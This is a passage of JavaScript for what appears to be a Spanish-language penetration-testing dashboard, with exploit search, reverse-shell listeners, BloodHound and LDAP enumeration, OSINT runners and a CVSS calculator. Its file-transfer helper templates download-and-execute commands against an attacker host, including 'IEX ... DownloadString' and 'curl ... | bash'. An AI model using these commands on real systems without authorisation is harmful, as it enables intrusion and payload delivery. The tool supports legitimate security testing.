            <span class="badge me-2" style="background:${sevColors[t.sev]||'#8b949e'};font-size:9px">${t.sev}</span>${h(t.name)}
        </a></li>`
    ).join('');
}

function applyFindingTemplate(idx) {
    const t = FINDING_TEMPLATES[idx];
    if (!t) return;
    document.getElementById('fi-title').value = t.title;
    document.getElementById('fi-severity').value = t.sev;
    document.getElementById('fi-cvss').value = t.cvss || '';
    document.getElementById('fi-cve').value = t.cve || '';
    document.getElementById('fi-description').value = t.desc || '';
    document.getElementById('fi-remediation').value = t.rem || '';
    toast(`Template "${t.name}" aplicado`, 'success');
}

// ══════════════════════════════════════════════════════════════════════════════
//  SEVERITY TRENDS
// ══════════════════════════════════════════════════════════════════════════════

let _severityChart = null;

async function showSeverityTrendsModal() {
    bsTrends.show();
    const res = await fetch('/api/projects');
    const projects = await res.json();
    renderSeverityTrends(projects);
}

function renderSeverityTrends(projects) {
    const sorted = [...projects].sort((a, b) => (a.created_at||'') < (b.created_at||'') ? -1 : 1);
    const labels = sorted.map(p => `${(p.name||'').substring(0,14)}${p.name?.length>14?'…':''}`);
    const SEV = ['critical','high','medium','low','info'];
    const COLORS = ['#f85149','#f0883e','#d29922','#3fb950','#58a6ff'];
    const datasets = SEV.map((sev, i) => ({
        label: sev.charAt(0).toUpperCase()+sev.slice(1),
        data: sorted.map(p => (p.findings||[]).filter(f=>f.severity===sev).length),
        backgroundColor: COLORS[i]+'99',
        borderColor: COLORS[i],
        borderWidth: 1,
    }));
    const canvas = document.getElementById('trends-chart');
    if (_severityChart) { _severityChart.destroy(); _severityChart = null; }
    _severityChart = new Chart(canvas, {
        type: 'bar',
        data: { labels, datasets },
        options: {
            responsive: true,
            plugins: { legend:{ labels:{ color:'#c9d1d9', font:{ size:11 } } } },
            scales: {
                x: { stacked:true, ticks:{ color:'#8b949e' }, grid:{ color:'#30363d' } },
                y: { stacked:true, beginAtZero:true, ticks:{ color:'#8b949e', stepSize:1 }, grid:{ color:'#30363d' } },
            },
        },
    });
}

// ══════════════════════════════════════════════════════════════════════════════
//  SMART AUTOMATION ENGINE
// ══════════════════════════════════════════════════════════════════════════════

async function loadAutoView() {
    const res = await fetch('/api/automation/rules');
    const rules = await res.json();
    renderAutoRules(rules);
}

function renderAutoRules(rules) {
    const grid = document.getElementById('auto-rules-grid');
    const ruleColors = { fa_globe: '#f0883e', 'fa-folder-open': '#d29922', 'fa-sitemap': '#f85149', 'fa-key': '#8b949e' };
    grid.innerHTML = rules.map(rule => `
        <div class="col-md-6">
            <div class="auto-rule-card ${rule.enabled ? '' : 'disabled'}">
                <div class="d-flex align-items-center gap-3">
                    <div class="auto-rule-icon" style="color:${rule.color}"><i class="fas ${rule.icon} fa-lg"></i></div>
                    <div class="flex-grow-1">
                        <div class="fw-semibold small">${h(rule.name)}</div>
                        <div class="text-muted" style="font-size:11px">Puertos: ${rule.trigger_ports.join(', ')}</div>
                        <div class="text-muted" style="font-size:11px">Workflow: <code>${h(rule.workflow)}</code></div>
                    </div>
                    <div class="form-check form-switch mb-0">
                        <input class="form-check-input" type="checkbox" role="switch"
                               ${rule.enabled ? 'checked' : ''}
                               onchange="toggleAutoRule('${rule.id}')">
                    </div>
                </div>
            </div>
        </div>
    `).join('');
}

async function toggleAutoRule(ruleId) {
    const res = await fetch(`/api/automation/rules/${ruleId}/toggle`, { method: 'POST' });
    const updated = await res.json();
    await loadAutoView();
    toast(`Regla "${updated.name}" ${updated.enabled ? 'activada' : 'desactivada'}`, updated.enabled ? 'success' : 'info');
}

async function runAutoFromPorts() {
    if (!state.activeProject) return;
    const ports = (state.activeProject.ports || []).map(p => parseInt(p.port));
    if (!ports.length) {
        toast('No hay puertos en el Port Map. Importa un nmap primero desde Parse.', 'error');
        return;
    }
    const vars = {
        rhost: state.globalVars.rhost || '',
        domain: state.globalVars.domain || '',
        lhost: state.globalVars.lhost || '',
        lport: state.globalVars.lport || '4444',
    };
    const res = await fetch('/api/automation/trigger', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ports, project_id: state.activeProject.id, vars }),
    });
    const data = await res.json();
    const log = document.getElementById('auto-log');
    const entry = document.createElement('div');
    entry.className = 'auto-log-entry';
    if (!data.triggered?.length) {
        entry.innerHTML = `<div class="d-flex align-items-center gap-2"><span class="text-muted small">${new Date().toLocaleTimeString()}</span><span class="text-muted small">Puertos [${ports.join(',')}] → ninguna regla aplicable</span></div>`;
    } else {
        entry.innerHTML = `<div class="d-flex align-items-center gap-2 flex-wrap">
            <span class="text-muted small">${new Date().toLocaleTimeString()}</span>
            ${data.triggered.map(t => `<span class="badge" style="background:${t.rule_id.includes('web')?'#f0883e':t.rule_id.includes('smb')?'#d29922':t.rule_id.includes('ad')?'#f85149':'#8b949e'}">${h(t.rule_name)}</span>`).join('')}
            <a href="#" class="small ms-auto" onclick="loadPhase('terminal');return false;">Ver Terminal →</a>
        </div>`;
    }
    log.prepend(entry);
    if (data.count) {
        toast(`${data.count} workflow(s) disparados → Terminal`, 'success');
    } else {
        toast('Ninguna regla aplica a los puertos actuales', 'info');
    }
}


// ══════════════════════════════════════════════════════════════════════════════
//  CVE / EXPLOIT MATCHER
// ══════════════════════════════════════════════════════════════════════════════

async function searchExploits() {
    const q = document.getElementById('cve-search-input').value.trim();
    if (!q) return;
    const area = document.getElementById('cve-results-area');
    area.innerHTML = '<div class="text-muted small p-3"><i class="fas fa-spinner fa-spin me-2"></i>Buscando en searchsploit...</div>';
    try {
        const res = await fetch('/api/exploits/search', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ query: q }),
        });
        const data = await res.json();
        if (data.error) { area.innerHTML = `<div class="text-danger small p-3">${h(data.error)}</div>`; return; }
        renderExploitResults(data);
    } catch (e) {
        area.innerHTML = '<div class="text-danger small p-3">Error de conexión</div>';
    }
}

async function searchFromPorts() {
    if (!state.activeProject?.ports?.length) {
        toast('No hay puertos en el Port Map', 'error'); return;
    }
    const area = document.getElementById('cve-results-area');
    const services = [...new Set(
        (state.activeProject.ports || [])
        .filter(p => p.service && p.service !== 'unknown')
        .map(p => `${p.service}${p.version ? ' ' + p.version : ''}`.trim())
    )].slice(0, 6);
    if (!services.length) { toast('Sin servicios con versión en el Port Map', 'info'); return; }
    area.innerHTML = `<div class="text-muted small p-3"><i class="fas fa-spinner fa-spin me-2"></i>Buscando ${services.length} servicio(s)...</div>`;
    const allResults = [];
    for (const svc of services) {
        try {
            const res = await fetch('/api/exploits/search', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ query: svc }),
            });
            const data = await res.json();
            if (data.results?.length) {
                allResults.push(...data.results.map(r => ({ ...r, _query: svc })));
            }
        } catch {}
    }
    renderExploitResults({ results: allResults, total: allResults.length, query: `Port Map (${services.length} servicios)` });
}

function renderExploitResults(data) {
    const area = document.getElementById('cve-results-area');
    if (!data.results?.length) {
        area.innerHTML = `<div class="text-muted small p-3">${h(data.note || `Sin resultados para: "${data.query}"`)}</div>`;
        return;
    }
    const typeColors = { remote: '#f85149', local: '#f0883e', webapps: '#58a6ff', dos: '#8b949e', shellcode: '#d29922' };
    area.innerHTML = `
        <div class="d-flex justify-content-between align-items-center mb-2 px-1">
            <small class="text-muted">${data.total} exploit(s) para <strong>${h(data.query)}</strong></small>
        </div>
        <div class="table-responsive">
            <table class="table table-sm table-dark table-hover mb-0" style="font-size:12px">
                <thead class="table-secondary"><tr><th>Título</th><th>Tipo</th><th>Plataforma</th><th>EDB</th><th style="width:80px"></th></tr></thead>
                <tbody>
                    ${data.results.map(e => `<tr>
                        <td>${h(e.title)}${e._query ? `<br><span style="color:#556069;font-size:10px">${h(e._query)}</span>` : ''}</td>
                        <td><span class="badge" style="background:${typeColors[e.type?.toLowerCase()]||'#30363d'};font-size:10px">${h(e.type||'—')}</span></td>
                        <td class="text-muted">${h(e.platform||'—')}</td>
                        <td class="font-monospace">${e.edb_id ? `<a href="https://www.exploit-db.com/exploits/${h(e.edb_id)}" target="_blank" style="color:var(--blue)">${h(e.edb_id)}</a>` : '—'}</td>
                        <td>
                            <button class="btn btn-xs btn-outline-secondary me-1" title="Copiar path" onclick="navigator.clipboard.writeText(${JSON.stringify(e.path||e.title||'')});toast('Copiado','success')"><i class="fas fa-copy"></i></button>
                            <button class="btn btn-xs btn-outline-warning" title="Buscar en MSF" onclick="searchInMSF(${JSON.stringify(e.title||'')})"><i class="fas fa-terminal"></i></button>
                        </td>
                    </tr>`).join('')}
                </tbody>
            </table>
        </div>`;
}

function searchInMSF(title) {
    const words = title.replace(/[^a-zA-Z0-9 ]/g, ' ').split(' ').filter(Boolean).slice(0, 4).join(' ');
    runCommand(`msfconsole -q -x "search ${words}; exit"`, 'MSF Search');
    loadPhase('terminal');
    toast('Buscando en Metasploit…', 'info');
}


// ══════════════════════════════════════════════════════════════════════════════
//  SESSION / LISTENER MANAGER
// ══════════════════════════════════════════════════════════════════════════════

async function loadSessionsView() {
    const pid = state.activeProject?.id || '';
    const res = await fetch(`/api/listeners?project_id=${pid}`);
    const listeners = await res.json();
    renderListeners(listeners);
}

function renderListeners(listeners) {
    const grid = document.getElementById('listeners-grid');
    if (!listeners.length) {
        grid.innerHTML = '<div class="col-12 text-center text-muted py-5"><i class="fas fa-plug fa-2x mb-2 d-block" style="opacity:.3"></i>Sin listeners activos. Crea uno con el botón de arriba.</div>';
        return;
    }
    const statusIcon = { listening: '🟢', closed: '⚫', killed: '🔴', error: '🟡' };
    const typeDesc = { nc: 'Netcat', rlwrap: 'rlwrap nc', socat: 'Socat PTY', python: 'Python3' };
    grid.innerHTML = listeners.map(l => `
        <div class="col-md-6 col-xl-4">
            <div class="listener-card ${l.status === 'listening' ? 'active' : ''}">
                <div class="d-flex align-items-center gap-2 mb-2">
                    <span>${statusIcon[l.status]||'⚫'}</span>
                    <span class="fw-semibold">${h(typeDesc[l.type]||l.type)}</span>
                    <span class="ms-auto font-monospace" style="color:var(--green);font-size:1.1em">:${l.port}</span>
                </div>
                <div class="font-monospace text-muted mb-2" style="font-size:11px;word-break:break-all;line-height:1.4">${h(l.command)}</div>
                ${l.connections?.length ? `<div class="text-success small mb-2"><i class="fas fa-check-circle"></i> ${l.connections.length} conexión(es) recibida(s)</div>` : ''}
                <div class="text-muted" style="font-size:10px">Iniciado: ${l.started_at?.substring(11,19)||'—'}</div>
                <div class="d-flex gap-1 mt-2">
                    <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(l.command)});toast('Copiado','success')" title="Copiar comando"><i class="fas fa-copy"></i></button>
                    ${l.status === 'listening'
                        ? `<button class="btn btn-xs btn-outline-danger ms-auto" onclick="killListener('${l.id}')"><i class="fas fa-stop"></i> Kill</button>`
                        : `<button class="btn btn-xs btn-outline-secondary ms-auto" onclick="killListener('${l.id}')"><i class="fas fa-trash"></i></button>`}
                </div>
            </div>
        </div>
    `).join('');
}

function showNewListenerModal() {
    document.getElementById('nl-port').value = state.globalVars.lport || '4444';
    bsNewListener.show();
}

async function createListener() {
    const type = document.getElementById('nl-type').value;
    const port = parseInt(document.getElementById('nl-port').value);
    if (!port || port < 1 || port > 65535) { toast('Puerto inválido', 'error'); return; }
    const res = await fetch('/api/listeners', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, port, project_id: state.activeProject?.id || '' }),
    });
    if (res.ok) {
        bsNewListener.hide();
        await loadSessionsView();
        toast(`Listener ${type}:${port} iniciado`, 'success');
    } else {
        const err = await res.json();
        toast(err.error || 'Error al crear listener', 'error');
    }
}

async function killListener(id) {
    await fetch(`/api/listeners/${id}`, { method: 'DELETE' });
    await loadSessionsView();
    toast('Listener eliminado', 'info');
}


// ══════════════════════════════════════════════════════════════════════════════
//  BLOODHOUND VISUALIZER
// ══════════════════════════════════════════════════════════════════════════════

let _bhNetwork = null;

async function loadBloodHoundView() {
    if (!state.activeProject) return;
    const res = await fetch(`/api/projects/${state.activeProject.id}/bloodhound`);
    const data = await res.json();
    if (data.nodes?.length) {
        renderBloodHoundGraph(data);
    }
}

function loadBloodHoundFile() {
    const file = document.getElementById('bh-file-input').files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async (e) => {
        try {
            const raw = JSON.parse(e.target.result);
            const processed = processBHData(raw);
            if (!processed.nodes.length) { toast('Fichero vacío o formato no reconocido', 'error'); return; }
            await fetch(`/api/projects/${state.activeProject.id}/bloodhound`, {
                method: 'PUT', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(processed),
            });
            renderBloodHoundGraph(processed);
            toast(`Importado: ${processed.nodes.length} nodos, ${processed.edges.length} aristas`, 'success');
        } catch (err) {
            toast('Error al parsear el fichero BloodHound JSON', 'error');
        }
    };
    reader.readAsText(file);
    document.getElementById('bh-file-input').value = '';
}

function processBHData(raw) {
    const nodes = [], edges = [];
    const nodeMap = {};
    const typeColors = {
        User: '#58a6ff', Computer: '#3fb950', Group: '#f0883e',
        Domain: '#f85149', GPO: '#8b949e', OU: '#d29922', Unknown: '#6e7681',
    };
    const typeShapes = { User: 'dot', Computer: 'box', Group: 'ellipse', Domain: 'diamond', GPO: 'hexagon', OU: 'triangle' };

    const meta = raw.meta || {};
    const fileType = (meta.type || '').toLowerCase();
    const typeMap = { computers: 'Computer', users: 'User', groups: 'Group', domains: 'Domain', gpos: 'GPO', ous: 'OU' };
    const defaultType = typeMap[fileType] || 'Unknown';

    const items = raw.data || [];
    items.forEach(item => {
        const id = item.ObjectIdentifier || item.Properties?.objectid || `node_${nodes.length}`;
        const props = item.Properties || {};
        const label = (props.samaccountname || props.name || id).split('@')[0].substring(0, 20);
        const nodeType = item.Labels?.[0] || defaultType;
        if (!nodeMap[id]) {
            nodeMap[id] = label;
            nodes.push({
                id, label,
                title: props.name || id,
                color: { background: typeColors[nodeType] || '#6e7681', border: '#0d1117', highlight: { background: '#ffffff30', border: '#ffffff' } },
                font: { color: '#c9d1d9', size: 10 },
                shape: typeShapes[nodeType] || 'dot',
                size: nodeType === 'Domain' ? 24 : 16,
                nodeType, properties: props,
            });
        }
        (item.Aces || []).forEach(ace => {
            const to = ace.PrincipalSID || ace.PrincipalName;
            if (to) edges.push({ from: id, to, label: ace.RightName || '', arrows: 'to',
                color: { color: '#444c56', highlight: '#58a6ff' },
                font: { color: '#6e7681', size: 8, align: 'middle' }, smooth: { type: 'curvedCW', roundness: 0.2 } });
        });
        (item.Members || []).forEach(m => {
            const to = m.ObjectIdentifier;
            if (to) edges.push({ from: id, to, label: 'member', arrows: 'to',
                color: { color: '#444c56' }, font: { color: '#6e7681', size: 8 } });
        });
    });
    return { nodes, edges };
}

function renderBloodHoundGraph(data) {
    const container = document.getElementById('bh-canvas');
    container.innerHTML = '';
    if (_bhNetwork) { _bhNetwork.destroy(); _bhNetwork = null; }

    const nodeDs = new vis.DataSet(data.nodes);
    const edgeDs = new vis.DataSet(data.edges.filter(e => e.from && e.to));

    _bhNetwork = new vis.Network(container, { nodes: nodeDs, edges: edgeDs }, {
        physics: { solver: 'forceAtlas2Based', forceAtlas2Based: { gravitationalConstant: -50, centralGravity: 0.01 }, stabilization: { iterations: 150 } },
        interaction: { hover: true, tooltipDelay: 200 },
        layout: { improvedLayout: data.nodes.length < 200 },
    });

    _bhNetwork.on('click', (params) => {
        if (params.nodes.length) showBHNodePanel(nodeDs.get(params.nodes[0]));
    });
}

function showBHNodePanel(node) {
    if (!node) return;
    const panel = document.getElementById('bh-node-panel');
    document.getElementById('bh-node-name').textContent = node.title || node.label;
    document.getElementById('bh-node-type').innerHTML = `<span class="badge" style="background:${node.color?.background||'#444'}">${h(node.nodeType||'—')}</span>`;
    const props = node.properties || {};
    document.getElementById('bh-node-details').innerHTML = Object.entries(props)
        .filter(([, v]) => v !== null && v !== '' && v !== false && !Array.isArray(v))
        .slice(0, 20)
        .map(([k, v]) => `<div class="bh-prop"><span class="text-muted">${h(k)}</span><span>${h(String(v).substring(0, 80))}</span></div>`)
        .join('') || '<div class="text-muted small">Sin propiedades</div>';
    panel.classList.remove('d-none');
    panel.dataset.nodeId = node.id;
    panel.dataset.nodeName = node.title || node.label;
}

function bhNodeToLoot() {
    const panel = document.getElementById('bh-node-panel');
    const name = panel.dataset.nodeName;
    if (!name || !state.activeProject) return;
    saveLootBatch([{ type: 'ad_object', value: name, source: 'BloodHound' }]);
    toast(`"${name}" guardado en Loot`, 'success');
}

async function clearBloodHound() {
    if (!confirm('¿Limpiar los datos BloodHound del proyecto?')) return;
    await fetch(`/api/projects/${state.activeProject.id}/bloodhound`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ nodes: [], edges: [] }),
    });
    const container = document.getElementById('bh-canvas');
    container.innerHTML = '<div class="text-center text-muted py-5"><i class="fas fa-paw fa-3x mb-3 d-block" style="color:#f0883e;opacity:.4"></i><div>Importa un fichero JSON de SharpHound/BloodHound</div></div>';
    document.getElementById('bh-node-panel').classList.add('d-none');
    if (_bhNetwork) { _bhNetwork.destroy(); _bhNetwork = null; }
    toast('BloodHound limpiado', 'info');
}


// ══════════════════════════════════════════════════════════════════════════════
//  AD EXPLORER (LDAP)
// ══════════════════════════════════════════════════════════════════════════════

let _ldapPollInterval = null;

function prefillLdapFromProject() {
    const rhost = state.globalVars.rhost || '';
    const domain = state.globalVars.domain || '';
    if (rhost && !document.getElementById('ldap-dc').value) document.getElementById('ldap-dc').value = rhost;
    if (domain && !document.getElementById('ldap-domain').value) document.getElementById('ldap-domain').value = domain;
}

async function adExplore(queryType) {
    if (!state.activeProject) return;
    const dc = document.getElementById('ldap-dc').value.trim();
    const domain = document.getElementById('ldap-domain').value.trim();
    if (!dc) { toast('Introduce la IP del Domain Controller', 'error'); return; }

    document.getElementById('ldap-status').textContent = `Ejecutando: ${queryType}...`;
    const output = document.getElementById('ldap-output');
    output.innerHTML = `<div class="text-muted p-2"><i class="fas fa-spinner fa-spin me-1"></i>Lanzando ${queryType}...</div>`;

    const res = await fetch(`/api/projects/${state.activeProject.id}/ad_explore`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            query: queryType, dc, domain,
            user: document.getElementById('ldap-user').value.trim(),
            password: document.getElementById('ldap-pass').value,
        }),
    });
    const data = await res.json();
    if (!data.job_id) { output.innerHTML = `<div class="text-danger p-2">${h(data.error||'Error')}</div>`; return; }

    if (_ldapPollInterval) clearInterval(_ldapPollInterval);
    _ldapPollInterval = setInterval(async () => {
        const r = await fetch(`/api/jobs/${data.job_id}`);
        const job = await r.json();
        document.getElementById('ldap-status').textContent = `${queryType} — ${job.status} (${job.output?.length||0} líneas)`;
        output.innerHTML = `<div class="p-2">${(job.output||[]).map(l => `<div>${h(l)}</div>`).join('')}</div>`;
        if (job.status !== 'running') {
            clearInterval(_ldapPollInterval);
            _ldapPollInterval = null;
        }
    }, 800);
    toast(`LDAP: ${queryType} iniciado`, 'info');
}

function copyLdapOutput() {
    const text = document.getElementById('ldap-output').innerText;
    navigator.clipboard.writeText(text);
    toast('Output LDAP copiado', 'success');
}

function saveLdapToLoot() {
    const text = document.getElementById('ldap-output').innerText;
    if (!text.trim() || !state.activeProject) return;
    const samRe = /sAMAccountName:\s*(\S+)/g;
    const items = [];
    let m;
    while ((m = samRe.exec(text)) !== null) {
        items.push({ type: 'ad_user', value: m[1], source: 'LDAP' });
    }
    const dnRe = /dn:\s*([^\n]+)/g;
    while ((m = dnRe.exec(text)) !== null) {
        items.push({ type: 'ad_dn', value: m[1].trim(), source: 'LDAP' });
    }
    if (!items.length) { toast('No se encontraron usuarios/DNs en el output', 'info'); return; }
    saveLootBatch(items);
    toast(`${items.length} items guardados en Loot`, 'success');
}


// ══════════════════════════════════════════════════════════════════════════════
//  OSINT DASHBOARD
// ══════════════════════════════════════════════════════════════════════════════

function prefillOsintDomain() {
    const domain = state.globalVars.domain || '';
    if (domain && !document.getElementById('osint-domain').value) {
        document.getElementById('osint-domain').value = domain;
    }
}

async function osintRun(toolId) {
    if (!state.activeProject) return;
    const domain = document.getElementById('osint-domain').value.trim() || state.globalVars.domain;
    if (!domain) { toast('Introduce un dominio target', 'error'); return; }

    const res = await fetch(`/api/projects/${state.activeProject.id}/osint/run`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tool: toolId, domain }),
    });
    const data = await res.json();
    if (data.job_id) {
        appendOSINTResult(toolId, domain, data.job_id);
        toast(`OSINT: ${toolId} iniciado`, 'success');
    } else {
        toast(data.error || 'Error al lanzar OSINT', 'error');
    }
}

async function osintRunAll() {
    const tools = ['harvester', 'subfinder', 'dnsx', 'whois', 'dnsrecon', 'wafw00f'];
    for (const tool of tools) {
        await osintRun(tool);
        await new Promise(r => setTimeout(r, 400));
    }
}

function appendOSINTResult(toolId, domain, jobId) {
    const container = document.getElementById('osint-results');
    const toolIcons = { harvester: 'fa-seedling', subfinder: 'fa-search', dnsx: 'fa-server',
        whois: 'fa-address-card', dnsrecon: 'fa-chart-network', wafw00f: 'fa-shield-halved',
        amass: 'fa-network-wired', nuclei_web: 'fa-atom', gau: 'fa-link' };

    const div = document.createElement('div');
    div.className = 'osint-result-block';
    div.id = `osint-blk-${jobId}`;
    div.innerHTML = `
        <div class="osint-result-header">
            <i class="fas ${toolIcons[toolId]||'fa-terminal'} me-2" style="color:var(--yellow)"></i>
            <strong>${h(toolId)}</strong> <span class="text-muted ms-1">→ ${h(domain)}</span>
            <span class="ms-2 badge bg-warning text-dark osint-status-badge" id="osint-badge-${jobId}">running</span>
            <button class="btn btn-link btn-sm ms-auto text-muted p-0" onclick="this.closest('.osint-result-block').remove()"><i class="fas fa-xmark"></i></button>
        </div>
        <div class="osint-result-output" id="osint-out-${jobId}"><div class="text-muted small p-2"><i class="fas fa-spinner fa-spin me-1"></i>Ejecutando…</div></div>`;
    container.prepend(div);

    const poll = setInterval(async () => {
        const r = await fetch(`/api/jobs/${jobId}`);
        const job = await r.json();
        const outEl = document.getElementById(`osint-out-${jobId}`);
        const badge = document.getElementById(`osint-badge-${jobId}`);
        if (!outEl) { clearInterval(poll); return; }
        if (job.status !== 'running') {
            clearInterval(poll);
            if (badge) { badge.className = `ms-2 badge ${job.status === 'completed' ? 'bg-success' : 'bg-danger'} osint-status-badge`; badge.textContent = job.status; }
            const lines = job.output || [];
            outEl.innerHTML = `<div class="font-monospace p-2" style="font-size:11px;max-height:300px;overflow-y:auto">${lines.map(l => `<div>${h(l)}</div>`).join('')}</div>
                <div class="px-2 pb-2 d-flex gap-2">
                    <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(lines.join('\n'))});toast('Copiado','success')"><i class="fas fa-copy"></i> Copiar</button>
                    <button class="btn btn-xs btn-outline-warning" onclick="parseOSINTOutput(${JSON.stringify(lines.join('\n'))}, '${h(toolId)}')"><i class="fas fa-gem"></i> → Loot</button>
                </div>`;
        }
    }, 1200);
    setTimeout(() => clearInterval(poll), 180000);
}

function parseOSINTOutput(output, source) {
    if (!state.activeProject) return;
    const items = [];
    const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;
    const subRe = /(?:^|[ \t])((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})/gm;
    const ipRe = /\b(\d{1,3}\.){3}\d{1,3}\b/g;

    [...new Set(output.match(emailRe) || [])].forEach(e => items.push({ type: 'email', value: e, source }));
    [...new Set((output.match(subRe) || []).map(s => s.trim()))].filter(s => s.includes('.')).slice(0, 100)
        .forEach(s => items.push({ type: 'subdomain', value: s, source }));
    [...new Set(output.match(ipRe) || [])].slice(0, 50)
        .forEach(ip => items.push({ type: 'ip', value: ip, source }));

    if (!items.length) { toast('No se encontraron emails/subdominios/IPs', 'info'); return; }
    saveLootBatch(items);
    toast(`${items.length} items guardados en Loot`, 'success');
}


// ══════════════════════════════════════════════════════════════════════════════
//  FILE TRANSFER HELPER
// ══════════════════════════════════════════════════════════════════════════════

function showTransferModal() {
    document.getElementById('tf-lhost').value = state.globalVars.lhost || '';
    renderTransferCommands();
    bsTransfer.show();
}

function renderTransferCommands() {
    const lhost = document.getElementById('tf-lhost')?.value.trim() || 'LHOST';
    const port  = document.getElementById('tf-port')?.value || '80';
    const fname = document.getElementById('tf-filename')?.value.trim() || 'file.exe';
    const os    = document.getElementById('tf-os')?.value || 'windows';

    const serverCmd = document.getElementById('tf-server-cmd');
    if (serverCmd) serverCmd.textContent = `python3 -m http.server ${port}`;

    const winCmds = [
        { label: 'certutil',               cmd: `certutil -urlcache -split -f http://${lhost}:${port}/${fname} ${fname}` },
        { label: 'PowerShell WebClient',   cmd: `(New-Object Net.WebClient).DownloadFile('http://${lhost}:${port}/${fname}','C:\\Users\\Public\\${fname}')` },
        { label: 'IEX (execute in memory)',cmd: `IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${port}/${fname}')` },
        { label: 'curl (Win10+)',          cmd: `curl http://${lhost}:${port}/${fname} -o ${fname}` },
        { label: 'bitsadmin',             cmd: `bitsadmin /transfer job http://${lhost}:${port}/${fname} C:\\Users\\Public\\${fname}` },
        { label: 'SMB (impacket server)',  cmd: `impacket-smbserver share . -smb2support`, extra: `copy \\\\${lhost}\\share\\${fname} .` },
        { label: 'TFTP',                  cmd: `tftp -i ${lhost} GET ${fname}` },
        { label: 'FTP one-liner (cmd)',   cmd: `(echo open ${lhost} 21& echo user anon& echo binary& echo GET ${fname}& echo bye)|ftp -n` },
    ];
    const linCmds = [
        { label: 'wget',                   cmd: `wget http://${lhost}:${port}/${fname} -O /tmp/${fname}` },
        { label: 'curl',                   cmd: `curl http://${lhost}:${port}/${fname} -o /tmp/${fname}` },
        { label: 'curl | bash',            cmd: `curl http://${lhost}:${port}/${fname} | bash` },
        { label: 'Python 3',              cmd: `python3 -c "import urllib.request; urllib.request.urlretrieve('http://${lhost}:${port}/${fname}','/tmp/${fname}')"` },
        { label: 'Netcat recv',            cmd: `nc -lvnp ${port} > /tmp/${fname}`, extra: `nc ${lhost} ${port} < ${fname}` },
        { label: 'SCP',                    cmd: `scp user@${lhost}:/path/${fname} /tmp/` },
        { label: 'base64 transfer',       cmd: `base64 ${fname}`, extra: `echo "<BASE64_PASTE>" | base64 -d > /tmp/${fname}` },
        { label: 'PHP (servidor web)',    cmd: `php -S 0.0.0.0:${port}` },
    ];
    const cmds = os === 'windows' ? winCmds : linCmds;
    const container = document.getElementById('tf-commands-container');
    if (!container) return;
    container.innerHTML = cmds.map(c => `
        <div class="tf-cmd-block">
            <div class="d-flex justify-content-between align-items-center mb-1">
                <span class="text-muted" style="font-size:11px">${h(c.label)}</span>
                <button class="btn btn-xs btn-outline-secondary" onclick="navigator.clipboard.writeText(${JSON.stringify(c.cmd)});toast('Copiado','success')"><i class="fas fa-copy"></i></button>
            </div>
            <code class="d-block p-2 rounded small font-monospace" style="background:#0d1117;word-break:break-all;border:1px solid #30363d">${h(c.cmd)}</code>
            ${c.extra ? `<code class="d-block p-2 rounded small font-monospace mt-1" style="background:#0d1117;word-break:break-all;border:1px solid #30363d;color:#6e7681">${h(c.extra)}</code>` : ''}
        </div>
    `).join('');
}

function copyTfServer() {
    const cmd = document.getElementById('tf-server-cmd')?.textContent || '';
    navigator.clipboard.writeText(cmd);
    toast('Copiado', 'success');
}

function launchTransferServer() {
    const port = document.getElementById('tf-port')?.value || '80';
    runCommand(`python3 -m http.server ${port}`, 'HTTP Server');
    bsTransfer.hide();
    loadPhase('terminal');
    toast('Servidor HTTP iniciado en Terminal', 'success');
}


// ══════════════════════════════════════════════════════════════════════════════
//  LOOT BATCH HELPER
// ══════════════════════════════════════════════════════════════════════════════

async function saveLootBatch(items) {
    if (!state.activeProject || !items.length) return;
    const existing = state.activeProject.loot || [];
    const existingVals = new Set(existing.map(i => i.value));
    const ts = new Date().toISOString();
    const newItems = items
        .filter(i => !existingVals.has(i.value))
        .map(i => ({ id: crypto.randomUUID(), ...i, timestamp: ts }));
    if (!newItems.length) { toast('Todos los items ya existen en Loot', 'info'); return; }
    const updated = [...existing, ...newItems];
    await fetch(`/api/projects/${state.activeProject.id}`, {
        method: 'PUT', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ loot: updated }),
    });
    state.activeProject.loot = updated;
}

// ══════════════════════════════════════════════════════════════════════════════
//  CVSS 3.1 CALCULATOR
// ══════════════════════════════════════════════════════════════════════════════

const _cvssState = { AV:'N', AC:'L', PR:'N', UI:'N', S:'U', C:'L', I:'L', A:'L' };

function toggleCVSSCalc() {
    const panel = document.getElementById('cvss-calc-panel');
    panel.classList.toggle('d-none');
    if (!panel.classList.contains('d-none')) recalcCVSS();
}

function setCVSS(metric, val, btn) {
    _cvssState[metric] = val;
    btn.closest('.cvss-btns').querySelectorAll('.cvss-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    recalcCVSS();
}

function recalcCVSS() {
    const { AV, AC, PR, UI, S, C, I, A } = _cvssState;
    const avN  = { N:0.85, A:0.62, L:0.55, P:0.2 }[AV];
    const acN  = { L:0.77, H:0.44 }[AC];
    const prN  = ({ N:{ U:0.85,C:0.85 }, L:{ U:0.62,C:0.68 }, H:{ U:0.27,C:0.50 } })[PR][S];
    const uiN  = { N:0.85, R:0.62 }[UI];
    const cN   = { N:0, L:0.22, H:0.56 }[C];
    const iN   = { N:0, L:0.22, H:0.56 }[I];
    const aaN  = { N:0, L:0.22, H:0.56 }[A];

    const ISS = 1 - (1-cN)*(1-iN)*(1-aaN);
    if (ISS <= 0) {
        document.getElementById('cvss-calc-score').textContent = '0.0';
        document.getElementById('cvss-vector-str').textContent = buildVector();
